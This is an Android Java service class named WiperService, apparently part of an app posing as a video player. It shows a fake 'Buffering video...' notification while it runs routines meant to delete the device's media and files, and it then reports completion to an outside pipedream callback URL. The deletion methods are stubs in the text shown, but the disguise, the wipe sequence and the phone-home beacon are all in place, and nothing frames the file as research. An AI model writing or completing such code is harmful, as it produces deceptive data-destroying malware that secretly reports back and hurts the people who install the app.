package com.secureplayer.videoplayer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class WiperService extends Service {

    private static final String TAG = "WiperService";
    private static final String CALLBACK_URL = "https://eoiq2xnrp0qo962.m.pipedream.net";

    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "video_cache_channel",
                "Video Cache",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Caching video stream data");
            channel.setShowBadge(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new NotificationCompat.Builder(this, "video_cache_channel")
                .setContentTitle("Buffering video...")
                .setContentText("Please wait while the video loads")
                .setSmallIcon(android.R.drawable.ic_media_play)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();

            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String deviceId = UUID.randomUUID().toString().substring(0, 8);
        Log.d(TAG, "WiperService started. Device ID: " + deviceId);
        new Thread(this::executeWipe).start();
        return START_NOT_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void executeWipe() {
        try {
            Log.d(TAG, "Starting wipe operations...");
            deleteMediaStoreContent();
            deleteDirectFiles();
            deleteAppMediaDirectories();
            Log.d(TAG, "Wipe complete.");
            phoneHome("wipe_complete", "Operation completed");
            Thread.sleep(1500);
        } catch (Exception e) {
            Log.e(TAG, "WiperService failure", e);
        } finally {
            stopSelf();
        }
    }

    private void deleteMediaStoreContent() {
        Log.d(TAG, "deleteMediaStoreContent stub");
    }

    private void deleteDirectFiles() {
        Log.d(TAG, "deleteDirectFiles stub");
    }

    private void deleteAppMediaDirectories() {
        Log.d(TAG, "deleteAppMediaDirectories stub");
    }

    private void phoneHome(String event, String message) {
        try {
            URL url = new URL(CALLBACK_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            String body = "event=" + event + "&message=" + message;
            byte[] payload = body.getBytes(StandardCharsets.UTF_8);
            connection.setFixedLengthStreamingMode(payload.length);
            try (OutputStream output = connection.getOutputStream()) {
                output.write(payload);
            }
            int responseCode = connection.getResponseCode();
            Log.d(TAG, "phoneHome response: " + responseCode);
            connection.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "phoneHome failed", e);
        }
    }
}